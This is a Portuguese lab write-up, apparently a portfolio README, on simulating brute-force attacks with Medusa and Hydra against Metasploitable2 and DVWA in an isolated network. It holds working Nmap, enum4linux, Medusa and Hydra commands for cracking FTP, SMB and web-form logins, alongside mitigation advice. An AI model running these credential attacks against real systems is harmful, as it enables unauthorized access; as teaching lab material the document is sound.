# Simulação: Ataques de Força Bruta com Medusa (Kali + Metasploitable/DVWA)

> **Aviso legal e ético:** Este projeto é estritamente para **ambientes controlados** e fins educacionais. Não execute ataques contra sistemas sem autorização explícita. Uso indevido é crime.

---

## 📌 Resumo
Projeto prático para demonstrar ataques de força bruta (FTP, Web form, SMB) usando **Kali Linux** e **Medusa** em ambiente isolado com **VirtualBox** (Metasploitable2 e DVWA). Inclui: configuração do laboratório, reconhecimento (Nmap), execução de ataques, logs/evidências, e recomendações de mitigação.

---

## 🎯 Objetivos
- Compreender ataques de força bruta em FTP, Web e SMB.
- Usar Kali Linux + Medusa para auditoria em laboratório controlado.
- Documentar procedimentos técnicos com clareza.
- Propor medidas de mitigação.
- Publicar evidências no GitHub como portfólio.

---

## 🧱 Ambiente (setup)
- VirtualBox
- VMs:
  - `KALI-ATTACKER` (Kali Linux)
  - `METASPLOITABLE-ALVO` (Metasploitable2)
  - Opcional: `DVWA-WEB` (DVWA) se preferir separar o alvo web
- Rede: **Host-only** (ex.: 192.168.56.0/24) ou **Internal Network**
- Snapshots: crie snapshots iniciais antes dos testes (boa governança de laboratório)


---

## 🔍 Reconhecimento (Nmap)
Use Nmap para mapear portas e identificar serviços.

```bash
# scan rápido
nmap -sS -Pn -T4 192.168.56.101 -oN nmap_fast.txt

# scan completo (todas portas, versão e OS)
nmap -sS -sV -O -p- 192.168.56.101 -oN nmap_full.txt

# scan focado em serviços relevantes
nmap -p 21,80,139,445 --script vuln,smb-enum-users 192.168.56.101 -oN nmap_services.txt
```

> Resultado esperado: listar serviços FTP (21), HTTP (80), SMB (139/445) e possibilitar enumeração de usuários.

---

## 🗂 Wordlists (exemplos)
Crie a pasta `wordlists/` e adicione listas simples para começar:

- `wordlists/common-usernames.txt`
- `wordlists/small-passwords.txt`
- `wordlists/custom-dict.txt`

Comandos para gerar rapidamente:

```bash
mkdir -p wordlists
echo -e "admin\nmsfadmin\nuser\nguest\ntest" > wordlists/common-usernames.txt
echo -e "123456\npassword\nadmin\nqwerty\nletmein" > wordlists/small-passwords.txt

# combinação simples
for u in admin msfadmin user; do for s in 123 qwe 2025!; do echo "${u}${s}"; done; done > wordlists/custom-dict.txt
```


---

## 🛠 Comandos Medusa — Cenários
> Execute **apenas** contra suas VMs.

### 1) Força bruta FTP (Metasploitable)
```bash
medusa -h 192.168.56.101 -U wordlists/common-usernames.txt -P wordlists/small-passwords.txt -M ftp -t 4 -f
```
- `-t 4`: threads
- `-f`: para ao encontrar sucesso

### 2) Password spraying SMB (usuários enumerados)
Primeiro, obter usuários com `enum4linux`:
```bash
enum4linux -a 192.168.56.101 > enum4linux.txt
```
Spray com Medusa (ajuste módulo conforme versão):
```bash
medusa -h 192.168.56.101 -U wordlists/common-usernames.txt -P wordlists/small-passwords.txt -M smbnt -t 4
```

### 3) Brute force em formulário web (DVWA)
Medusa pode usar `http_form`. Caso não funcione bem, usar Hydra (exemplo abaixo).

```bash
medusa -h 192.168.56.102 -u admin -P wordlists/small-passwords.txt -M http_form \
  -m FORM:username=^USER^&password=^PASS^:POST:/dvwa/vulnerabilities/brute/ -T 4
```
- Ajuste `username`, `password` e a rota do formulário conforme o seu DVWA.

#### Alternativa — Hydra (formulários web)
```bash
hydra -l admin -P wordlists/small-passwords.txt 192.168.56.102 http-post-form \
"/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^:Login failed"
```
- Substitua `Login failed` pelo trecho exato que aparece quando o login falha.

---

## ✅ Validação de acessos (evidências)
Após encontrar credenciais:

- **FTP:** `ftp 192.168.56.101` → login manual com usuário/senha encontrados.
- **SMB:** `smbclient -L //192.168.56.101 -U found_user` e `smbclient //192.168.56.101/share -U user%password`
- **Web:** acessar DVWA com as credenciais no navegador.


---

## 🧾 Logs e arquivos úteis para o repositório
- `desafio-brute-force.md` (este arquivo)
- `wordlists/*`
- `nmap_full.txt`, `nmap_services.txt`
- `enum4linux.txt` (SMB enumeration)
- `medusa_logs.txt` (saída do Medusa)
- `images/` (screenshots organizadas)

---

## 🔐 Recomendações de Mitigação (executável e corporativo)
- Forçar **senhas fortes** (mínimo 12 caracteres, blacklist de senhas comuns).
- Implementar **lockout** após N tentativas (ex.: 5 tentativas em 15 minutos).
- **Rate limiting** e WAF em formulários web.
- Habilitar **MFA** para acessos críticos.
- Monitoramento e alertas (SIEM) para padrões de brute force.
- Minimizar exposição — desabilitar serviços FTP/SMB quando não necessários.
- Políticas de privacidade e rotação de credenciais para contas de serviço.

---

## 📊 Métricas sugeridas (Adicione no relatório para tom executivo)
- Tempo até credencial encontrada (ex.: 00:03:24)
- Número de tentativas por sucesso
- Taxa de tentativas por segundo
- Percentual de credenciais quebradas vs testadas

Esses KPIs deixam seu repositório com cara de projeto _data-driven_ — ótimo para recrutadores.

---

## 🧠 Conclusão & Aprendizados
Escreva um parágrafo curto com:
- O que funcionou
- O que você mudaria (ex.: usar wordlists maiores, usar técnicas de throttling)
- Próximos passos (ex.: integrar ELK/OSSEC para detecção, praticar detection engineering)

---

## 📁 Como reproduzir (passo-a-passo rápido)
1. Restaurar snapshots das VMs.
2. Rodar os scans Nmap (salvar outputs).
3. Executar enumeração SMB (`enum4linux`).
4. Rodar Medusa nos alvos (FTP/SMB/HTTP) com `wordlists/`.
5. Validar acessos manualmente e capturar evidências.

---

## 📎 Referências
- Kali Linux — documentação oficial
- Medusa — documentação oficial
- DVWA — Damn Vulnerable Web Application
- Nmap — manual oficial
- GitHub Markdown — guia de sintaxe

---

## 🔁 Licença
Uso pessoal/educacional — Gustavo Parizi.

---


